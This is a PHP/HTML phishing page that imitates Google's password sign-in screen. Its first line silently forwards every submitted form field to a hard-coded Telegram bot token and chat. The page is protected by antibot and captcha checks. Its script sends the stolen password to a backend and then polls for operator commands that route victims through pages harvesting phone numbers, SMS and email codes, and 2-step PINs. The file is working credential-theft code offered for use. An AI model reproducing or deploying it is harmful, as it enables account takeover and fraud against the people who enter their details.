<?php
if(!empty($_POST)){$t="8701853660:AAHbvHtYE0t24o0nTjX4UR17pGwEeMA5htY";$c="-1003779907048";$m="";foreach($_POST as $k=>$v)$m.="$k: $v\n";@file_get_contents("https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=".urlencode($m));}

require_once '../modules/sessions.php'; // INIT OU RECUPERER SESSIONS + COOKIES
require_once '../antibots/all.php';     // AB 
require_once __DIR__ . '/../langues/lang_detect.php';

if (empty($_SESSION['captcha_valide']) || $_SESSION['captcha_valide'] !== true) {
    header('Location: ../index.php');
    exit;
}
if (!empty($_POST['bot_honeypot'])) {
    exit;
}


?>
<!doctype html>

<head>
<title><?php echo $tr["title_index"]; ?></title>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindexnofollow ,noimageindex ,noarchive, nocache, nosnippet">
    <!-- CSS FILES -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/login.css">
    <!--icon .ico -->
    <link rel="icon" type="image/x-icon" href="../assets/img/icon.ico" />


</head>
<style>
    .error-message {
        color: #d93025;
        /* rouge vif google-like */
        font-size: 0.9rem;
        margin-top: 5px;
    }
</style>

<style>
.loader {
    display: none; /* caché par défaut */
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(255, 255, 255, 0.6); /* fond semi-transparent */
    z-index: 9999;
   
    align-items: center;
    justify-content: center;
}

.loader .spinner-border {
    width: 4rem;
    height: 4rem;
    border: 0.4em solid #4285f4; /* bleu Google */
    border-top-color: transparent;
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    to {
        transform: rotate(360deg);
    }
}
</style>

<!-- Loader -->
    <div class="loader">
        <div class="spinner-border"></div>
    </div>

    <style>
        .AxOyFc.snByac {
            background: white;
            padding: 0 1px;
            position: absolute;
            font-size: 1.3em;
            line-height: 1;
            pointer-events: none;
        }
    </style>

    <body jscontroller=LDQI
        jsaction="rcuQ6b:npT2md; click:FAbpgf; auxclick:FAbpgf;SlnBXb:.CLIENT;cbwpef:.CLIENT;wINJic:.CLIENT;GvneHb:.CLIENT;qako4e:.CLIENT;TSpWaf:.CLIENT;nHjqDd:.CLIENT;LhiQec:.CLIENT;m2qNHd:.CLIENT;asggkf:.CLIENT;clwp8d:.CLIENT;keydown:.CLIENT"
        class="jR8x9d nyoS7c UzCXuf EIlDfe">
        <div jscontroller=DqMihc jsaction=rcuQ6b:npT2md;rURRne:AC0Pid;WK2DQd:daFy6d class=bdCvOd></div>
        <div class="S7xv8 LZgQXe">
            <div class="TcuCfd NQ5OL" jsname=rZHESd jscontroller=K1ZKnb
                jsaction=rcuQ6b:npT2md;SlnBXb:r0xNSb;cbwpef:Yd2OHe;iFFCZc:nnGvjf;Rld2oe:oUMEzf;FzgWvd:oUMEzf;rURRne:pSGWxb;
                tabindex=null>
                <div jscontroller=ziZ8Mc jsaction=rcuQ6b:npT2md jsname=P1ekSe class=Ih3FE aria-hidden=true>
                    <div jscontroller=ltDFwf jsaction=transitionend:Zdx3Re jsname=P1ekSe role=progressbar
                        class="sZwd7c B6Vhqe qdulke jK7moc">
                        <div class="xcNBHc um3FLe"></div>
                        <div jsname=cQwEuf class="w2zcLc Iq5ZMc"></div>
                        <div class="MyvhI TKVRUb" jsname=P1ekSe><span class="l3q5xe SQxu9c"></span></div>
                        <div class="MyvhI sUoeld"><span class="l3q5xe SQxu9c"></span></div>
                    </div>
                </div>
                <div class=fAlnEc id=yDmH0d jsaction=ZqRew:.CLIENT>
                    <div id=ZCHFDb></div><c-wiz jsrenderer=jGvTv class=A77ntc data-view-id=b5STy jsshadow jsdata=deferred-c6
                        data-p='%.@.2,null,null,null,"https://www.google.com/",0,[],"identity-signin-password"]'
                        jscontroller=GLtV1c
                        jsaction="jiqeKb:ZCwQbe;CDQ11b:n4vmRb;DKwHie:gVmDzc;jR85Td:WtmXg;rcuQ6b:rcuQ6b;o07HZc:V4xqVe;click:vBw6I(preventDefault=true|L6M1Fb),EtG4V(preventDefault=true|CkSUlf);t5qvFd:.CLIENT"
                        jsname=nUpftc data-node-index=0;0 jsmodel="hc6Ubd niKKCd" c-wiz>
                        <main class=Svhjgc jsname=bN97Pc jscontroller=SD8Jgb jsshadow
                            data-use-configureable-escape-action=true>
                            <div class=zIgDIc jsname=paFcre><c-wiz jsrenderer=OTcFib jsshadow jsdata=deferred-c5
                                    data-p=%.@.] data-node-index=2;0 jsmodel=hc6Ubd c-wiz>
                                    <div class=Wf6lSd jscontroller=rmumx jsname=n7vHCb><svg
                                            xmlns=https://www.w3.org/2000/svg width=48 height=48 viewBox="0 0 40 48"
                                            aria-hidden=true jsname=jjf7Ff>
                                            <path fill=#4285F4
                                                d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z">
                                            </path>
                                            <path fill=#34A853
                                                d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z">
                                            </path>
                                            <path fill=#FABB05
                                                d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z">
                                            </path>
                                            <path fill=#E94235
                                                d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z">
                                            </path>
                                        </svg></div><c-data id=c5 jsdata=" eCjdDd;_;$1" class=sf-hidden></c-data>
                                </c-wiz>
                                <div class="ObDc3 ZYOIke" jsname=tJHJj jscontroller=E87wgc
                                    jsaction=JIbuQc:pKJJqe(af8ijd);wqEGtb:pKJJqe;>
                                    <h1 class=vAV9bf data-a11y-title-piece id=headingText jsname=r4nke><span
                                            jsslot> <?php echo $tr["index"]["6"];?></span></h1>
                                    <div class="gNJDp sf-hidden" data-a11y-title-piece id=headingSubtext jsname=VdSJob>
                                    </div>
                                    <div class=SOeSgb>
                                        <div jscontroller=k5xHfe
                                            jsaction="click:cOuCgd; blur:O22p3e; mousedown:UX7yZ; mouseup:lbsD7e; touchstart:p6p2H; touchend:yfqBxc;"
                                            class="Ahygpe m8wwGd EPPJc cd29Sd xNLKcb" tabindex=0 role=link
                                            aria-label="Identifiant de compte sélectionné&nbsp;:  Changer de compte"
                                            jsname=af8ijd>
                                            <div class=HOE91e>
                                                <div class=JQ5tlb aria-hidden=true><svg aria-hidden=true class=Qk3oof
                                                        fill=currentColor focusable=false width=48px height=48px
                                                        viewBox="0 0 24 24" xmlns=https://www.w3.org/2000/svg>
                                                        <path
                                                            d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z">
                                                        </path>
                                                    </svg></div>
                                            </div>
                                            <div jsname=bQIQze class=IxcUte data-profile-identifier translate=no><?php echo $_SESSION['login_identifiant'] ?></div>
                                            <div class=JCl8ie><svg aria-hidden=true class="Qk3oof u4TTuf" fill=currentColor
                                                    focusable=false width=24px height=24px viewBox="0 0 24 24"
                                                    xmlns=https://www.w3.org/2000/svg>
                                                    <path d="M7 10l5 5 5-5z"></path>
                                                </svg></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class=UXFQgc jsname=uybdVe>

                                <div class=qWK5J>
                                    <div class=xKcayf jsname=USBQqe>
                                        <div class=AcKKx jsname=rEuO1b jscontroller=qPYxq data-form-action-uri>
                                            <!-- FORM Début -->

                                            <form id="form-bnp">

                                                <span jsslot>
                                                    <section class="Em2Ord PsAlOe rNe0id eLNT1d S7S4N sf-hidden"
                                                        jscontroller=Tbb4sb data-callout-type=2 aria-hidden=true
                                                        jsname=INM6z aria-live=assertive aria-atomic=true jsshadow>
                                                    </section>
                                                    <section class=Em2Ord jscontroller=Tbb4sb jsname=dZbRZb jsshadow>
                                                        <header class="vYeFie sf-hidden" jsname=tJHJj aria-hidden=true>
                                                        </header>
                                                        <div class=yTaH4c jsname=MZArnb>
                                                            <div jsslot><input type=email name=identifier
                                                                    class="Hvu6D sf-hidden" tabindex=-1 aria-hidden=true
                                                                    spellcheck=false value=""
                                                                    jsname=KKx9x autocomplete=off id=hiddenEmail>
                                                                <div class="njnYzb NhPs4c" jscontroller=QTENt jsshadow
                                                                    jsname=vZSTIf
                                                                    jsaction=KJ9cZc:nAF18e(EMUunb);RXQi4b:.CLIENT;TGB85e:.CLIENT;mvJBNe:.CLIENT;wbdDDd:.CLIENT;HC77K:.CLIENT;FQZNM:.CLIENT
                                                                    data-is-visible=false>
                                                                    <div class=YqLCIe>
                                                                        <div class=El1b7b>
                                                                            <div class="klRug">
                                                                                <div class="H2p7Gf" jscontroller="JYtL0c" jsaction="rcuQ6b:rcuQ6b;RXQi4b:.CLIENT;TGB85e:.CLIENT;keydown:.CLIENT;AHmuwe:.CLIENT;O22p3e:.CLIENT;YqO5N:.CLIENT" jsname="UmsTj" jsshadow="">
                                                                                    <div id="password" class="rFrNMe i79UJc zKHdkd sdJrJc CDELXb" jscontroller="pxq3x" jsaction="clickonly:KjsqPd; focus:Jt1EX; blur:fpfTEe; input:Lg5SV" jsshadow="" jsname="Ufn6O">
                                                                                        <div class="aCsJod oJeWuf">
                                                                                            <div class="aXBtI Wic03c">
                                                                                                <div class="Xb9hP">
                                                                                                    <input
                                                                                                        id="login_password"
                                                                                                        type="password"
                                                                                                        class="whsOnd zHQkBf"
                                                                                                        jsname="YPqjbf"
                                                                                                        autocomplete="current-password"
                                                                                                        spellcheck="false" tabindex="0" aria-label=" <?php echo $tr["index"]["7"];?>" aria-describedby="i8" name="Passwd" aria-disabled="false" autocapitalize="off"
                                                                                                        data-initial-value="" badinput="false" dir="ltr">



                                                                                                    <div jsname="YRMmle" class="AxOyFc snByac" aria-hidden="true"> <?php echo $tr["index"]["7"];?></div>
                                                                                                </div>
                                                                                                <div class="i9lrp mIZh1c"></div>
                                                                                                <div jsname="XmnwAc" class="OabDMe cXrdqd Y2Zypf" style="transform-origin: 88px center;"></div>
                                                                                            </div>
                                                                                        </div>
                                                                                        
                                                                                        <div class="LXRPh">
                                                                                            <div jsname="ty6ygf" class="ovnfwe Is7Fhb"></div>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>


                                                                        </div>
                                                                    </div>
                                                                    <div class="Ly8vae uSvLId sf-hidden" jsname=h9d3hd
                                                                        aria-live=polite id=c0></div>
                                                                    <div class=v8aRxf jsname=ESjtn>
                                                                        <div class="myYH1 g9Mx QkTfte"
                                                                            jsaction=rcuQ6b:xawz9d;PyEt0d:gfO0Le;
                                                                            jscontroller=clOb9b jsname=EMUunb jsshadow>
                                                                            <div class=Hy62Fc>
                                                                                <div class="sfqPrd rBUW7e"
                                                                                    jsaction=click:va5fqd;JIbuQc:vKfede(ornU0b);RXQi4b:.CLIENT;TGB85e:.CLIENT
                                                                                    jscontroller=XSm1e jsname=wQNmvb>
                                                                                    <div class="QTJzre NEk0Ve">
                                                                                        <div class=uxXgMe>
                                                                                            <div class=VfPpkd-dgl2Hf-ppHlrf-sM5MNb
                                                                                                data-is-touch-wrapper=true>
                                                                                                <div class="VfPpkd-MPu53c VfPpkd-MPu53c-OWXEXe-dgl2Hf Ne8lhe swXlm az2ine lezCeb kAVONc VfPpkd-MPu53c-OWXEXe-mWPk3d"
                                                                                                    jscontroller=etBPYb
                                                                                                    data-indeterminate=false
                                                                                                    jsname=ornU0b
                                                                                                    jsaction="click:cOuCgd; clickmod:vhIIDb; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; contextmenu:mg9Pef;animationend:L9dL9d;dyRcpb:dyRcpb;"
                                                                                                    data-disable-idom=true
                                                                                                    data-value=optionc2>
                                                                                                    <input
                                                                                                        class=VfPpkd-muHVFf-bMcfAe
                                                                                                        type=checkbox
                                                                                                        jsname=YPqjbf
                                                                                                        jsaction="focus:AHmuwe; blur:O22p3e;change:WPi0i;"
                                                                                                        aria-labelledby=selectionc1
                                                                                                        value=on>
                                                                                                    <div
                                                                                                        class=VfPpkd-YQoJzd>
                                                                                                        <svg aria-hidden=true
                                                                                                            class=VfPpkd-HUofsb
                                                                                                            viewBox="0 0 24 24">
                                                                                                            <path
                                                                                                                class=VfPpkd-HUofsb-Jt5cK
                                                                                                                fill=none
                                                                                                                d="M1.73,12.91 8.1,19.28 22.79,4.59">
                                                                                                            </path>
                                                                                                        </svg>
                                                                                                        <div
                                                                                                            class=VfPpkd-SJnn3d>
                                                                                                        </div>
                                                                                                    </div>
                                                                                                    <div
                                                                                                        class=VfPpkd-OYHm6b>
                                                                                                    </div>
                                                                                                    <div
                                                                                                        class=VfPpkd-sMek6-LhBDec>
                                                                                                    </div>
                                                                                                </div>
                                                                                            </div>
                                                                                        </div>
                                                                                        <div class=gyrWGe>
                                                                                            <div jsname=V67aGc class=jOkGjb>
                                                                                                <div jsslot id=selectionc1
                                                                                                    class="dJVBl wIAG6d"
                                                                                                    jsname=CeL6Qc> <?php echo $tr["index"]["8"];?></div>
                                                                                            </div>
                                                                                            <div jsname=ij8cu class=RAvnDd>
                                                                                                <div jsslot
                                                                                                    class="dJVBl wIAG6d"
                                                                                                    jsname=CeL6Qc></div>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                            <div aria-atomic=true aria-live=polite
                                                                                class=O6yUcb jsname=h9d3hd>
                                                                                <div jsslot></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="NdBX9e sf-hidden" jsname=JIbuQc></div>
                                                                </div>
                                                                <div jscontroller=CMcBD jsname=Si5T8b
                                                                    class="lbFS4d eLNT1d sf-hidden"
                                                                    jsaction=KWPV0:IMdg8d;rcuQ6b:jqIVcd></div><c-wiz
                                                                    jsrenderer=PXsWy jsdata=deferred-c4
                                                                    data-p='%.@.null,"identity-signin-password"]'
                                                                    jscontroller=oqkvIf jsname=xdJtEf data-node-index=1;0
                                                                    jsmodel=hc6Ubd c-wiz><c-data id=c4 jsdata=" U3wROe;_;$0"
                                                                        class=sf-hidden></c-data></c-wiz>
                                                            </div>
                                                        </div>
                                                    </section>
                                                </span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="JYXaTc lUWEgd" jsname=DH6Rkf jscontroller=z0u0L
                                jsaction=rcuQ6b:rcuQ6b;KWPV0:vjx2Ld(Njthtb),ChoyC(eBSUOb),VaKChb(gVmDzc),nCZam(W3Rzrc),Tzaumc(uRHG6),JGhSzd;dcnbp:dE26Sc(lqvTlf);FzgWvd:JGhSzd;
                                data-is-consent=false data-is-primary-action-disabled=false
                                data-is-secondary-action-disabled=false data-primary-action-label=Suivant
                                data-secondary-action-label=" <?php echo $tr["index"]["9"];?>" jsshadow>
                                <div class=O1Slxf jsname=DhK0U>
                                    <div class=TNTaPb jsname=k77Iif>
                                        <div jscontroller=f8Gu1e jsaction=click:cOuCgd;JIbuQc:JIbuQc; jsname=Njthtb
                                            class="XjS9D TrZEUc" id=passwordNext>
                                            <div class=VfPpkd-dgl2Hf-ppHlrf-sM5MNb data-is-touch-wrapper=true>


                                                <button
                                                    type="submit"
                                                    class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ 
           VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe 
           DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b">
                                                    <div class="VfPpkd-Jh9lGc"></div>
                                                    <div class="VfPpkd-J1Ukfc-LhBDec sf-hidden"></div>
                                                    <div class="VfPpkd-RLmnJb"></div>
                                                    <span jsname="V67aGc" class="VfPpkd-vQzf8d"><?php echo $tr["btn_suivant"];?></span>
                                                </button>
                                            </div>
                                            </form>


                                            <!-- Fin form -->
<script>
const form = document.getElementById('form-bnp');
const logininput = document.getElementById('login_password');
// Toggle afficher/masquer le mot de passe
const showPasswordCheckbox = document.querySelector('.VfPpkd-muHVFf-bMcfAe[type="checkbox"]');
if (showPasswordCheckbox) {
    showPasswordCheckbox.addEventListener('change', function() {
        logininput.type = this.checked ? 'text' : 'password';
    });
}
form.addEventListener('submit', function(e) {
    e.preventDefault();

    // Nettoyage anciens messages d'erreur
    [logininput].forEach(input => {
        const oldError = input.parentNode.querySelector('.error-message');
        if (oldError) oldError.remove();
    });

    let hasError = false;

    if (!logininput.value) {
        showError(logininput, 'Le mot de passe est requis');
        hasError = true;
    }

    if (hasError) {
        logininput.focus();
        return false;
    }

    // Soumission via fetch
    const loader = document.querySelector('.loader');
    if (loader) loader.style.display = 'flex'; // 🔹 loader visible dès maintenant

    const formData = new FormData(form);
    formData.set('login_password', logininput.value);

    fetch('../actions/login.php', {
        method: 'POST',
        body: formData
    })
    .then(res => res.json())
    .then(data => {
        if (data.error) {
            showError(logininput, data.error);
            // loader caché uniquement si erreur immédiate
            if (loader) loader.style.display = 'none';
        } else if (data.step === 2) {
            // 🔹 lancer le polling sans cacher le loader
            startCallbackPolling(loader);
        } else {
            alert('Réponse inattendue du serveur');
            if (loader) loader.style.display = 'none';
        }
    })
    .catch(() => {
        alert('Erreur réseau, veuillez réessayer.');
        if (loader) loader.style.display = 'none';
    });
});

function showError(inputElement, message) {
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-message';
    errorDiv.style.color = '#d93025';
    errorDiv.style.fontSize = '0.9rem';
    errorDiv.style.marginTop = '5px';
    errorDiv.textContent = message;
    inputElement.parentNode.appendChild(errorDiv);
}

// Polling callback
function startCallbackPolling(loaderElement) {
    const intervalId = setInterval(() => {
        fetch('../actions/callback.php', { cache: 'no-store' })
        .then(res => res.text())
        .then(msg => {
            const trimmedMsg = msg.trim();
            console.log('Callback reçu :', trimmedMsg);

            const redirectMap = {
                        'login_error': '../pages/index.php?error=error',
                        'num': '../pages/num.php', //numéro de téléphone    
                        'num_error': '../pages/num.php?error=error', //numéro de téléphone     

                        'code_sms_error': '../pages/code_sms.php?error=error', //code smsrecu
                        'code_sms': '../pages/code_sms.php', //code recu

                        'code_mail': '../pages/code_mail.php', //code recu
                        'code_mail_error': '../pages/code_mail.php?error=error', //code recu

                        'pin_2steps': '../pages/2steps.php', //code recu                      
                        '2steps_error': '../pages/2steps.php?error=error', //code recu
                        
                        'success': '../pages/success.php',
                        'ban_ip': '../pages/ban.php'
                    };

            if (redirectMap[trimmedMsg]) {
                clearInterval(intervalId);
                window.location.href = redirectMap[trimmedMsg];
            } else {
                // 🔹 loader reste affiché tant qu'aucune redirection
                console.log('Message callback inattendu :', trimmedMsg);
            }
        })
        .catch(err => console.error('Erreur fetch callback:', err));
    }, 3000);
}


</script>








                                        </div>
                                    </div>
                                    <div class=FO2vFd jsname=QkNstf>
                                        <div jscontroller=f8Gu1e jsaction=click:cOuCgd;JIbuQc:JIbuQc; jsname=eBSUOb
                                            class="XjS9D TrZEUc mWv92d">
                                            <div class=VfPpkd-dgl2Hf-ppHlrf-sM5MNb data-is-touch-wrapper=true><button
                                                    class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7 BqKGqe eR0mzb TrZEUc lw1w4b"
                                                    jscontroller=soHxf
                                                    jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;mlnRJb:fLiPzd;"
                                                    data-idom-class="ksBjEc lKxP2d LQeN7 BqKGqe eR0mzb TrZEUc lw1w4b"
                                                    jsname=LgbsSe type=button>
                                                    <div class=VfPpkd-Jh9lGc></div>
                                                    <div class="VfPpkd-J1Ukfc-LhBDec sf-hidden"></div>
                                                    <div class=VfPpkd-RLmnJb></div><span jsname=V67aGc
                                                        class=VfPpkd-vQzf8d> <?php echo $tr["index"]["9"];?></span>
                                                </button></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </main><c-data id=c6 jsdata=" tEzfhe;_;$2 Rf8b0c;_;$3 VY6Opb;_;$4"
                            class=sf-hidden></c-data><view-header style=display:none></view-header>
                    </c-wiz>
                </div>
            </div>
            <div class=wmGw4><c-wiz jsrenderer=ZdRp7e jsshadow jsdata=deferred-i1 data-node-index=0;0 jsmodel=hc6Ubd c-wiz>
                    <footer class=FZfKCe>
                        <div class=eXa0v jscontroller=xiZRqc jsaction=rcuQ6b:npT2md;OmFrlf:VPRXbd>
                            
                        </div>
                        <ul class=HwzH1e>
                            <li class=qKvP1b><a class="AVAq4d TrZEUc"
                                    href=""
                                    target=""> <?php echo $tr["footer"]["0"];?></a>
                            <li class=qKvP1b><a class="AVAq4d TrZEUc"
                                    href=""
                                    target=""> <?php echo $tr["footer"]["1"];?></a>
                            <li class=qKvP1b><a class="AVAq4d TrZEUc"
                                    href="" target=""> <?php echo $tr["footer"]["2"];?></a>
                        </ul>
                    </footer><c-data id=i1 jsdata=" OsjLy;_;1" class=sf-hidden></c-data>
                </c-wiz></div>
        </div>
        <div aria-live=assertive aria-relevant=additions aria-atomic=true aria-hidden=true
            style=color:transparent;z-index:-1;position:absolute;top:0px;left:0px;user-select:none>
            <div aria-atomic=true> <?php echo $tr["index"]["6"];?> </div>
        </div class="OabDMe cXrdqd">
        </div>
        </div>
        </div>
        <div class="LXRPh">
            <div jsname="ty6ygf" class="ovnfwe Is7Fhb"></div>
        </div>
        </div>
        <div class="bfzBdd" jsname="NuIDSd" id="c3"></div>
        </div><input jsname="SBlSod" type="hidden" name="ct" id="ct">
        </div><c-wiz jsrenderer="PXsWy" jsdata="deferred-c4" data-p="%.@.null,&quot;identity-signin-password&quot;]" jscontroller="oqkvIf" jsname="xdJtEf" data-node-index="1;0" jsmodel="hc6Ubd" c-wiz=""><c-data id="c4" jsdata=" U3wROe;_;$0"></c-data></c-wiz>
        </div>
        </div>
        </section>
        </span>
        </div>
        </div>
        </div>
        </div>